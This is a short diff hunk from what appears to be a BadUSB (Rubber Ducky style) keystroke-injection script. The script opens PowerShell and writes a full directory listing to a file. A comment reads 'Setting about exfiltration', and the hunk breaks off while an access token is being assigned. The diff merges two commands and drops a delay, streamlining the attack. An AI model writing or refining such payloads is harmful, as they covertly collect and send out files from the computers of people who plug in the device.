@@ -20,12 +20,7 @@ STRING PowerShell
 ENTER
 DELAY 1000
 
-STRINGLN  tree /f /a > out.txt
-
-REM It depends byt the content and by the path choosen
-DELAY 5000
-
-$filePath = ".\out.txt"
+STRINGLN  tree /f /a > out.txt; $filePath = ".\out.txt"
 
 REM Setting about exfiltration
 STRING $accessToken = 
